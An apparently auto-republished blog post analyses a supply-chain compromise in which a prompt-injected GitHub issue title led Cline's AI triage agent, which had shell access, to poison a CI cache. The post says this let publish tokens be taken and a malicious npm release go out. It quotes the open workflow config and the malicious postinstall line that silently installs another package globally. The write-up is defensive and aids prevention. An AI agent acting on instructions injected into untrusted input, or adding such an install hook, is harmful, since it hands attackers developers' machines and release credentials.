---
title: "Clinejection: How a GitHub Issue Title Compromised an AI Coding Assistant Used by 5M Developers"
slug: "clinejection-how-a-github-issue-title-compromised-an-ai-coding-assistant-used-by-5m-developers"
author: "Eldor Zufarov"
source: "devto_ai"
published: "Sun, 19 Jul 2026 03:17:32 +0000"
description: "TL;DR In December 2025, Cline — an AI coding assistant with over 5 million users — gave an AI agent (Claude) write access to triage GitHub issues, including ..."
keywords: "hop, cline, issue, user, not, github, agent, any"
generated: "2026-07-19T03:25:16.528697"
---

# Clinejection: How a GitHub Issue Title Compromised an AI Coding Assistant Used by 5M Developers

## Overview

TL;DR In December 2025, Cline — an AI coding assistant with over 5 million users — gave an AI agent (Claude) write access to triage GitHub issues, including permission to run shell commands. A misconfigured trigger condition let any GitHub user invoke the workflow. What followed was a four-hop supply chain compromise that ended with a malicious npm package silently installing a second AI agent on user machines. I broke down the full chain in video form: Watch the episode Below is the chain, hop by hop. Hop 0: The setup The triage automation was configured with broad tool permissions and a trigger condition open to any GitHub user — not just contributors. That second part is the root cause: it opened the trigger to unauthenticated input. (Exact config values are in the Confirmed Artifacts section below.) Hop 1: Prompt injection via issue title The issue title itself was never sanitized before reaching the model. No first-party source has published the exact injected payload verbatim — GHSA doesn't disclose it — so any reconstruction here is illustrative, not confirmed. What's confirmed is the mechanism: an untrusted string reached the model with tool access already granted. Hop 2: Cache poisoning The injected instruction deployed a tool (multiple independent postmortems — Snyk, Cloud Security Alliance — name it "Cacheract") that flooded the CI cache with over 10GB of junk data, evicting legitimate entries through standard LRU eviction. Hop 3: Nightly workflow inherits the poisoned cache The nightly release workflow restored that poisoned cache around 2 AM UTC and ran inside it — handing over three publish tokens. (Names confirmed across GHSA and multiple independent sources — see below.) Hop 4: Publication cline@2.3.0 went live on npm with a postinstall script that silently installed a second package globally — an AI agent, installed by an AI agent, with no user consent. This line is a direct quote from Cline's own security advisory, not a reconstruction. It's the strongest evidentiary point in the whole chain. (Full quote below.) Timeline Dec 9, 2025 — researcher reports the issue ~5 weeks of silence from maintainers Feb 17, 2026 — exploit lands in the wild, 8 days after public disclosure ~8 hours, ~4,000 installs before it was caught Why this matters beyond Cline This is the same shape as the tj-actions/changed-files compromise: a trusted automation connection nobody was actively monitoring. Different entry point (an AI triage agent instead of a CI tag), same underlying failure class. Three checks for your own repo Can any GitHub user (not just contributors) trigger your AI/automation workflows? Are your cache keys derived from anything user-controlled — issue titles, branch names, PR descriptions? Are your publish tokens long-lived and static, or do they rotate through OIDC? Confirmed artifacts These are the exact strings pulled directly from the postmortems and Cline's own advisory — no paraphrasing: Triage workflow config: --allowedTools "Bash,Read,Write,Edit" allowed_non_write_users : " *" Tokens exfiltrated (Hop 3): NPM_RELEASE_TOKEN VSCE_PAT OVSX_PAT Malicious postinstall script (Hop 4) — source: Cline security advisory: "postinstall" : "npm install -g openclaw@latest" The one element in this writeup that is not verbatim is the injected issue-title payload from Hop 1 — no source publishes it in full, so any version shown is a reconstruction, flagged as such. Full walkthrough with the chain visualized as a single 4-node graph (not four separate findings): https://youtu.be/69PuA4D7MLg Sources: Cline security advisory, GHSA, Cloud Security Alliance and Snyk postmortems.

## Key Insights

This article was discovered from the latest RSS feeds and automatically transformed into a readable blog post.

### What You Should Know

- Trending topic in the developer community
- Relevant technology discussion
- Worth exploring for deeper research

## Original Source

https://dev.to/eldor_zufarov_1966/clinejection-how-a-github-issue-title-compromised-an-ai-coding-assistant-used-by-5m-developers-1kb5

## Conclusion

Technology moves quickly. Following curated RSS feeds helps developers stay informed about emerging tools, frameworks, and industry trends.
